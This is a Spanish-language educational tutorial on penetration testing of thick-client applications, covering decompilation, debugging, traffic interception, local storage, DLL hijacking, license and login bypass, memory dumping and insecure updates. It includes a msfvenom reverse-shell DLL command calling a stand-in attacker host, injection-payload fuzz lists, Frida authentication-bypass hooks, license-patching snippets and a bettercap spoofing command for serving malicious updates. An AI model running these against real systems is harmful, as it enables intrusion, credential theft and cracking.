# Thick Client Pentesting — Pentesting de Clientes Ricos

> **Nivel:** Intermedio
> **Requisitos:** Windows, .NET/Java/C++, [redes](../raw/r3d3s-f0nd4m3nt0s.md), debugger
> **Arquitecturas:** [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86), [x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64), ARM64
> **Sistemas:** Windows (primario), Linux, macOS

---

## Indice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (760 lineas)


1. [Introduccion al Pentesting de Clientes Ricos](#1-introduccion-al-pentesting-de-clientes-ricos)
2. [Reconocimiento y Enumeracion Inicial](#2-reconocimiento-y-enumeracion-inicial)
3. [Analisis Estatico - Decompilacion](#3-analisis-estatico---decompilacion)
4. [Analisis Dinamico - Debugging](#4-analisis-dinamico---debugging)
5. [Analisis de Trafico de Red](#5-analisis-de-trafico-de-red)
6. [Analisis de Almacenamiento Local](#6-analisis-de-almacenamiento-local)
7. [DLL Hijacking e Inyeccion](#7-dll-hijacking-e-inyeccion)
8. [Manipulacion de APIs y Parametros](#8-manipulacion-de-apis-y-parametros)
9. [Bypass de Autenticacion Local](#9-bypass-de-autenticacion-local)
10. [Analisis de Memoria](#10-analisis-de-memoria)
11. [Protocolos Custom y Sockets](#11-protocolos-custom-y-sockets)
12. [Clientes Java - Tecnicas Especificas](#12-clientes-java---tecnicas-especificas)
13. [Clientes .NET - Tecnicas Especificas](#13-clientes-net---tecnicas-especificas)
14. [Electron / JavaScript](#14-electron--javascript)
15. [Actualizaciones Inseguras](#15-actualizaciones-inseguras)
16. [Hardening y Mitigaciones](#16-hardening-y-mitigaciones)
17. [Comparativa de Herramientas](#17-comparativa-de-herramientas)
18. [Ejercicios Practicos](#18-ejercicios-practicos)
19. [Recursos](#19-recursos)

## 1. Introduccion al Pentesting de Clientes Ricos

### 1.1. Que es un [thick client](../raw/th1ck-cl13nt-p3nt3st.md)?

Un thick client (cliente rico o pesado) es una aplicacion de software que se ejecuta en la maquina del usuario y maneja una parte significativa de la logica de negocio localmente, a diferencia de una aplicacion web liviana (thin client) donde la logica se procesa principalmente en el servidor. Los thick clients son comunmente utilizados en entornos empresariales para aplicaciones como ERP, CRM, software financiero, software medico, herramientas de diseno, y sistemas de gestion.

Ejemplos tipicos de thick clients incluyen:
- SAP GUI, Oracle E-Business Suite client (ERP)
- Bloomberg Terminal, MetaTrader (trading financiero)
- AutoCAD, SolidWorks (diseno)
- Aplicaciones .NET WinForms/WPF empresariales
- Aplicaciones Java Swing/JavaFX multiplataforma
- Software medico de historia clinica electronica
- Juegos online con conexion dedicada a servidor

A diferencia de una aplicacion web, el thick client tiene:
- **Codigo ejecutable local** (EXE, DLL, JAR)
- **Logica de negocio del lado cliente** (a veces redundante con el servidor)
- **Conexiones de [red](../raw/r3d3s-f0nd4m3nt0s.md) persistentes o semi-persistentes** al servidor
- **Acceso a recursos locales** ([sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos), registro, hardware)
- **Capacidad de almacenar datos localmente** (caché, configuracion, sesion)

### 1.2. Diferencia con Aplicaciones Web

| Aspecto | Aplicacion Web | Thick Client |
|---------|---------------|--------------|
| Codigo | En servidor (JS en cliente) | En el cliente (binario) |
| Logica | Servidor-side | Cliente y servidor |
| Red | [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/[https](../raw/r3d3s-f0nd4m3nt0s.md#https) (stateless) | Varios protocolos |
| Actualizacion | Instantanea (server) | Requiere instalacion |
| Analisis | Facil (HTTP visible) | Complejo (binario) |
| [ofuscacion](../raw/4pk-r3v3rs1ng.md#obfuscation) | JS ofuscado | Binario compilado |

### 1.3. Por que Pentestear Clientes Ricos?

Muchas organizaciones piensan que si el servidor backend es seguro, el cliente no importa. Esto es un error grave porque:

1. **El cliente contiene secretos:** Credenciales embebidas, claves API, connection strings en texto plano u ofuscadas.
2. **La logica del cliente puede ser revertida:** Algoritmos de negocio, licencias, [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) local pueden ser decompilados.
3. **El cliente confia en el servidor, pero viceversa tambien:** Si el cliente decide que enviar, un atacante puede modificar parametros.
4. **Actualizaciones inseguras:** Si un atacante compromete el mecanismo de actualizacion, puede distribuir malware a todos los clientes.
5. **Privilegios excesivos:** El cliente puede correr con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) elevados (Admin/System) permitiendo [escalada de privilegios](../raw/l1n9x-pr1v3sc.md).

### 1.4. Modelos de Cliente-Servidor

#### 1.4.1. Arquitectura 2-Tier

El cliente se conecta directamente a la base de datos. Esto es peligroso porque las credenciales de DB estan en el cliente y un atacante puede conectarse directamente a la DB con esas credenciales luego de decompilar.

```csharp
string connStr = "Server=prod-db.internal;Database=AppDB;User Id=app_user;Password=S3cr3t!";
SqlConnection conn = new SqlConnection(connStr);
```

#### 1.4.2. Arquitectura 3-Tier

El cliente se conecta a un servidor de aplicaciones, que a su vez se conecta a la DB. Es mas seguro porque el cliente no conoce credenciales de DB, pero aun puede enviar datos maliciosos al servidor.

## 2. Reconocimiento y Enumeracion Inicial

### 2.1. Identificacion del Binario

Antes de analizar, identificar el tipo de binario. Cada plataforma requiere herramientas distintas:

| Tipo | Extensiones | Herramientas |
|------|-------------|--------------|
| .NET Framework | .exe, .dll | dnSpy, ILSpy, de4dot |
| .NET Core | .exe, .dll | dnSpy, ILSpy |
| Java | .jar, .class | jd-gui, jadx, CFR |
| Delphi | .exe | IDR |
| C/C++ nativo | .exe, .dll | IDA Pro, Ghidra, x64dbg |
| Electron | .asar | asar extractor, DevTools |

Comando para identificar el compilador:

```powershell
dumpbin /headers target.exe | findstr "machine"
sigcheck -a target.exe
```

### 2.2. Instalacion y Configuracion

Examinar el instalador revela arquitectura del cliente:

```cmd
msiexec /a installer.msi /qb TARGETDIR=C:\extracted
lessmsi installer.msi
```

Que buscar: archivos instalados, servicios, registro, configuracion XML/JSON/INI, DLLs registradas.

### 2.3. Mapeo de Conexiones

```powershell
netstat -nab | findstr "target.exe"
tcpview.exe
tshark -i 1 -f "tcp port 443" -w capture.pcap
```

### 2.4. Archivos de Configuracion

```powershell
Get-ChildItem -Path "HKLM:\SOFTWARE\Vendor\App" -Recurse
Get-ChildItem -Path "C:\Program Files\Vendor" -Recurse -Include "*.config","*.xml","*.json","*.ini"
Get-ChildItem -Path "$env:LOCALAPPDATA\Vendor" -Recurse
```

Buscar: connection strings, URLs, credenciales embebidas, tokens, flags de debug.

### 2.5. Analisis de Dependencias

```powershell
Get-Process -Name target | Select-Object -ExpandProperty Modules | Format-Table ModuleName, FileName
```

Identificar DLLs de terceros con versiones vulnerables (log4j, Newtonsoft.Json, etc).

## 3. Analisis Estatico - Decompilacion

### 3.1. Decompilacion de .NET

dnSpy/ILSpy muestran el codigo fuente casi completo:

```csharp
// Buscar: connection strings, metodos de auth, cifrado, URLs
private static string connStr = "Server=10.10.10.50;Database=DB;User Id=sa;Password=P@ssw0rd!";

// Chequeo de licencia parcheable
if (LicenseManager.CheckLicense() == false) {
    Environment.Exit(1);
}
```

Para .NET ofuscado:

```powershell
de4dot.exe target.exe -o target_cleaned.exe
dnSpy.exe target_cleaned.exe
```

### 3.2. Decompilacion de Java

```bash
unzip application.jar -d extracted/
jadx application.jar -d sources/
grep -ri "password\|jdbc:\|apikey\|secret" sources/
```

### 3.3. Decompilacion de Binarios Nativos

En Ghidra/IDA: buscar strings (URLs, rutas, mensajes de error). Ejemplo de funcion vulnerable:

```c
bool validateLicense(char* key) {
    char expected[32];
    for (int i = 0; i < 32; i++)
        expected[i] = key[i] ^ 0x55;
    return strcmp(expected, hardcoded_key) == 0;
}
```

### 3.4. Analisis de Strings

```bash
strings target.exe | findstr /i "password\|http\|sql\|aes\|debug\|admin"
```

## 4. Analisis Dinamico - Debugging

### 4.1. Debugging con x64dbg (Nativo)

```asm
; Breakpoints en CreateFile, recv, send
; Modificar JNZ a JZ para bypass de auth
0x00401234  test eax, eax
0x00401236  jnz  0x00401500  ; cambiar a jmp
```

### 4.2. Debugging con dnSpy (.NET)

```csharp
// Click derecho > Edit Method > modificar C# > Compile
// Ejemplo: parchear chequeo de licencia
if (!ValidateLicense(licenseKey)) {
    MessageBox.Show("Invalid license");
    return;  // comentar esta linea
}
```

### 4.3. API Monitoring con API Monitor

Interceptar llamadas a: advapi32 (registro), ws2_32 (sockets), winhttp (HTTP), crypt32 (criptografia), CreateFile.

### 4.4. Hookeado con Frida

```javascript
var validateAddr = Module.findExportByName(null, "ValidatePassword");
if (validateAddr) {
    Interceptor.attach(validateAddr, {
        onEnter: function(args) {
            console.log("Password: " + args[0].readCString());
        },
        onLeave: function(retval) {
            retval.replace(1);
        }
    });
}
```

## 5. Analisis de Trafico de Red

### 5.1. Captura con Wireshark

```bash
tshark -i 1 -host 192.168.1.100 -w thick_client.pcap
```

Analizar: protocolos no estandar, cifrado, datos sensibles en plano, estructura de paquetes.

### 5.2. Proxy de Interceptacion

Para clientes HTTP/HTTPS:

```bash
# Fiddler como proxy del sistema
# Si el cliente usa WebRequest, respeta el proxy.
# Si usa sockets directos, no pasa por proxy.
```

Para clientes que ignoran el proxy: usar Echo Mirage, API Monitor, o MITM con ARP spoofing.

### 5.3. Analisis de Protocolos Custom

```python
import socket, struct

def parse_packet(data):
    length = struct.unpack('<I', data[0:4])[0]
    opcode = struct.unpack('<H', data[4:6])[0]
    payload = data[6:6+length]
    opcodes = {0x01: "LOGIN", 0x02: "LOGOUT", 0x03: "GET_DATA", 0x04: "SEND_DATA"}
    print(f"Opcode: {opcodes.get(opcode, hex(opcode))}, Payload: {len(payload)}b")
```

### 5.4. Replay de Paquetes

```python
s = socket.socket()
s.connect(("target", 4444))
original = bytes.fromhex("1a0002000000") + b"admin\x00" + bytes.fromhex("0a") + b"pass"
modified = original.replace(b"admin", b"admin' OR '1'='1")
s.send(modified)
```

## 6. Analisis de Almacenamiento Local

### 6.1. Bases de Datos Locales

```powershell
Get-ChildItem -Path "C:\ProgramData\Vendor" -Recurse -Include "*.db","*.sdf","*.mdb"
sqlite3 app.db ".tables"
sqlite3 app.db "SELECT * FROM credentials;"
```

### 6.2. Archivos de Cache y Logs

```powershell
Get-ChildItem -Path "$env:LOCALAPPDATA\Vendor" -Recurse -Include "*.cache","*.log","*.dat"
```

### 6.3. Credenciales Guardadas (Windows)

```powershell
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all
```

### 6.4. Configuracion Ofuscada

```python
def deobfuscate_xor(data, key=0xAA):
    return bytes(b ^ key for b in data)

import base64
with open("config.dat", "rb") as f:
    try:
        decoded = base64.b64decode(f.read())
        print(decoded.decode('utf-8', errors='replace'))
    except: pass
```

## 7. DLL Hijacking e Inyeccion

### 7.1. Busqueda de DLL Hijacking

Con Process Monitor: filtrar ProcessName = target.exe, Result = NAME NOT FOUND. DLLs que busca en CWD antes que System32 son hijackeables.

```powershell
# Generar DLL maliciosa
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll -o evil.dll
# Renombrar a la DLL que falta y colocar junto al .exe
```

### 7.2. DLL Injection

```csharp
[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
```

### 7.3. Detour con MinHook / Deviare

```csharp
var spyMgr = new SpyManager();
var hook = spyMgr.OnFunction("kernel32.dll", "CreateFileW");
hook.OnEnter += (args) => {
    if (args[0].Value.ToString().Contains("license.dat"))
        args[0].Value = "C:\temp\license_fake.dat";
};
spyMgr.Start();
```

## 8. Manipulacion de APIs y Parametros

### 8.1. Interceptacion con Fiddler

Si el cliente usa HTTP/HTTPS, forzar el proxy del sistema agregando al .config:

```xml
<system.net>
  <defaultProxy enabled="true">
    <proxy proxyaddress="http://127.0.0.1:8888" bypassonlocal="False"/>
  </defaultProxy>
</system.net>
```

### 8.2. Modificacion en Tiempo Real con dnSpy

```csharp
// Ejemplo: modificar Amount antes de enviar
private void btnTransfer_Click(object sender, EventArgs e) {
    TransferRequest req = new TransferRequest {
        FromAccount = txtFrom.Text,
        ToAccount = txtTo.Text,
        Amount = 999999.99m,  // parcheado
    };
    var response = apiClient.Post("/api/transfer", req);
}
```

### 8.3. Fuzzing de Parametros

```python
import requests
params = {'search': 'laptop', 'category': '1', 'page': '1'}
payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "<script>alert(1)</script>"]
for param in params:
    for payload in payloads:
        test = params.copy()
        test[param] = payload
        r = requests.post("https://target/api/search", data=test)
        if r.status_code == 500: print(f"Posible vuln en {param}: {payload}")
```

## 9. Bypass de Autenticacion Local

### 9.1. Chequeos de Licencia

```csharp
// Flag booleano parcheable
private bool isLicensed = false;  // cambiar a true

// Metodo de validacion parcheable
if (!LicenseChecker.Validate()) {
    Application.Exit();  // comentar
}

// Fecha de expiracion
if (DateTime.Now > expiryDate) {
    DisableFeatures();  // nop
}
```

### 9.2. Bypass de Login Local

```csharp
// Credenciales hardcoded
private bool Auth(string user, string pass) {
    return user == "admin" && pass == "admin123";
    // parche: return true;
}

// Hashing local
private bool Auth(string user, string pass) {
    return ComputeHash(pass) == GetStoredHash(user);
    // parche: return true;
}
```

### 9.3. Token Replay

Capturar token con Fiddler/API Monitor y reutilizarlo desde otra maquina. Verificar si el token incluye IP o User-Agent validable. Decodificar JWT en jwt.io.

## 10. Analisis de Memoria

### 10.1. Dumpeo de Memoria

```powershell
procdump.exe -ma target.exe memory.dmp
```

### 10.2. Analisis con WinDbg

```cmd
windbg -z memory.dmp
!address -summary
s -u 0 L?80000000 "password"
!dumpheap -stat
```

### 10.3. Busqueda de Datos Sensibles

```python
import re
with open("memory.dmp", "rb") as f:
    data = f.read()

patterns = {
    "Email": rb'[\w.+-]+@[\w.-]+\.[\w]{2,}',
    "ConnStr": rb'Server\s*=\s*[^;]+;Database\s*=\s*[^;]+;Password\s*=\s*[^;]+',
    "API Key": rb'api[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=]{20,})["\']',
}
for name, pat in patterns.items():
    matches = re.findall(pat, data.decode('utf-8', errors='replace'))
    if matches: print(f"{name}: {matches[:3]}")
```

### 10.4. Busqueda de Claves Criptograficas

```python
with open("memory.dmp", "rb") as f:
    data = f.read().decode('utf-8', errors='replace')
import re
for bits, pat in [(128, '[0-9a-fA-F]{32}'), (192, '[0-9a-fA-F]{48}'), (256, '[0-9a-fA-F]{64}')]:
    matches = re.findall(pat, data)
    print(f"AES-{bits}: {len(matches)} candidates")
```

## 11. Protocolos Custom y Sockets

### 11.1. Identificacion

Pasos: capturar con Wireshark, identificar patrones (magic bytes, opcodes), medir entropia (alta = cifrado), analizar handshake.

### 11.2. Reversing con Python

```python
import socket, struct

s = socket.socket()
s.connect(("server", 5555))

def send_packet(sock, data):
    packet = struct.pack('<I', len(data)) + data
    sock.send(packet)
    resp_len = struct.unpack('<I', sock.recv(4))[0]
    return sock.recv(resp_len)

for opcode in range(256):
    resp = send_packet(s, struct.pack('<B', opcode) + b'test')
    if len(resp) > 2:
        print(f"Opcode 0x{opcode:02x}: {resp[:20].hex()}")
```

### 11.3. Fuzzing con Boofuzz

```python
from boofuzz import *
session = Session(target=Target(Connection("tcp", "server", 5555)))
s_initialize("packet")
s_static("\x00\x01")
s_byte(0x01, name="opcode")
s_size("data", length=4)
s_string("data", name="data")
session.connect(s_get("packet"))
session.fuzz()
```

## 12. Clientes Java - Tecnicas Especificas

### 12.1. Descompilacion

```bash
unzip client.jar -d extracted/
cfr client.jar --outputdir sources/
jadx -d sources/ client.jar
```

### 12.2. Vulnerabilidades Comun

```java
// Deserializacion insegura
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Object obj = ois.readObject();

// XXE
Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(inputStream);

// SQLi
String q = "SELECT * FROM users WHERE username = '" + username + "'";

// Command Injection
Runtime.getRuntime().exec("ping " + hostname);
```

### 12.3. Instrumentacion con Frida

```javascript
Java.perform(function() {
    var Auth = Java.use("com.target.AuthManager");
    Auth.authenticate.implementation = function(user, pass) {
        console.log("Login: " + user + " / " + pass);
        return true;
    };
});
```

## 13. Clientes .NET - Tecnicas Especificas

### 13.1. Modificacion con dnSpy

```csharp
// Cambiar URL del servidor
private static string SERVER_URL = "https://attacker-server.com";
// Click derecho > Edit Method > modificar > Compile > Save Module
```

### 13.2. Configuracion .NET

```xml
<configuration>
  <appSettings>
    <add key="DatabaseConnection" value="Server=prod;Database=App;User Id=sa;Password=P@ss!" />
    <add key="EncryptionKey" value="AES256KeyHere" />
  </appSettings>
</configuration>
```

### 13.3. .NET Remoting / WCF

```powershell
$type = [System.Activator]::CreateInstance("RemoteAssembly", "RemoteObject")
$type.InvokeMethod("ExecuteCommand", "whoami")
```

## 14. Electron / JavaScript

### 14.1. Extraccion del Codigo

```bash
npm install -g @electron/asar
asar extract app.asar extracted/
find extracted/ -type f -name "*.js" | head -20
```

### 14.2. Habilitar DevTools

En Chromium DevTools (F12): Network tab (peticiones), Sources tab (debug), Console (modificar variables):

```javascript
window.apiKey = "fake-key";
localStorage.setItem('auth_token', 'modified-token');

// Hookear fetch
const originalFetch = window.fetch;
window.fetch = function() {
    console.log('Fetch:', arguments);
    return originalFetch.apply(this, arguments);
};
```

## 15. Actualizaciones Inseguras

### 15.1. Vectores de Ataque

- HTTP en lugar de HTTPS (MITM para distribuir binarios)
- Sin verificacion de firma (cualquier binario es aceptado)
- Sin checksum de integridad
- Path traversal en el nombre del paquete
- DNS spoofing del servidor de updates

### 15.2. Explotacion

```bash
# MITM con BetterCAP
bettercap -eval "set arp.spoof.targets 192.168.1.100; set dns.spoof.domains updates.target.com; set dns.spoof.address 192.168.1.50; arp.spoof on; dns.spoof on"

# Servir binario malicioso
python3 -m http.server 80
# Colocar malware como /target_2.1.0.1234.exe
```

## 16. Hardening y Mitigaciones

### 16.1. Proteccion de Codigo

```csharp
// Anti-debugging
public static bool IsDebuggerPresent() {
    return Debugger.IsAttached || NativeMethods.IsDebuggerPresent();
}

// Checksum de integridad
public static bool IsTampered() {
    byte[] expected = Convert.FromBase64String("BASE64_HASH");
    byte[] actual = SHA256.HashOf(File.ReadAllBytes(Application.ExecutablePath));
    return !expected.SequenceEqual(actual);
}
```

### 16.2. Proteccion de Comunicacion

```csharp
// Certificate pinning
ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => {
    const string THUMBPRINT = "ABCD1234...";
    return errors == SslPolicyErrors.None && cert.GetCertHashString() == THUMBPRINT;
};
```

### 16.3. Buenas Practicas

- No embeker credenciales (usar autenticacion delegada)
- Validar entrada del servidor (no confiar en el cliente)
- Cifrado extremo a extremo
- Firmar digitalmente las actualizaciones
- Rate limiting del lado del servidor
- Token de un solo uso (nonce)
- Minimizar logica de negocio en el cliente

## 17. Comparativa de Herramientas

### 17.1. Tabla

| Herramienta | Tipo | Plataforma | Precio |
|-------------|------|------------|--------|
| dnSpy / ILSpy | Decompilador .NET | Windows | Gratis |
| de4dot | Desofuscador .NET | Windows | Gratis |
| jd-gui / jadx | Decompilador Java | Multiplataforma | Gratis |
| CFR / Procyon | Decompilador Java | Multiplataforma | Gratis |
| IDA Pro | Disassembler | Multiplataforma | Pago ($) |
| Ghidra | Disassembler | Multiplataforma | Gratis |
| x64dbg | Debugger | Windows | Gratis |
| WinDbg | Debugger | Windows | Gratis |
| Frida | Instrumentation | Multiplataforma | Gratis |
| Fiddler | HTTP proxy | Windows | Gratis |
| Burp Suite | HTTP proxy | Multiplataforma | Freemium |
| Wireshark | Network analyzer | Multiplataforma | Gratis |

### 17.2. Flujo Recomendado

```bash
# 1. Identificar: file target.exe
# 2. Strings: strings target.exe | sort -u > strings.txt
# 3. Decompilar: dnSpy/jadx/Ghidra segun tipo
# 4. Debuggear: x64dbg/dnSpy
# 5. Capturar red: Wireshark
# 6. Modificar: Frida/Fiddler/API Monitor
```

## 18. Ejercicios Practicos

### 18.1. DVTA (Damn Vulnerable Thick Client App)

```powershell
git clone https://github.com/srini0x00/damn-vulnerable-thick-client-app
```

Objetivos: encontrar connection string, bypassear login, interceptar transferencia, SQL injection.

### 18.2. Laboratorio Propio

Crear una app .NET con: connection string embebida, credenciales hardcoded, HTTP sin validacion de certificado. Luego pentestearla.

### 18.3. CTFs

- Flare-On Challenge (FireEye)
- Crackmes.one
- HTB Reversing Machines
- R2con challenges

## 19. Recursos

### 19.1. Libros

- Practical Binary Analysis - Dennis Andriesse
- The IDA Pro Book - Chris Eagle
- Reversing: Secrets of Reverse Engineering - Eldad Eilam
- Windows Internals - Yosifovich et al.

### 19.2. Cursos

- SANS FOR610: Reverse Engineering Malware
- SANS SEC660: Advanced Penetration Testing
- OpenSecurityTraining: Reverse Engineering

### 19.3. Herramientas Online

- decompiler.com
- godbolt.org
- jwt.io
- CyberChef

### 19.4. Comunidades

- r/ReverseEngineering
- r/netsec
- 0x00sec.org
- OpenSecurityTraining.info

---

> **Disclaimer:** Este tutorial es con fines educativos. El pentesting de clientes gruesos debe practicarse solo en sistemas autorizados.
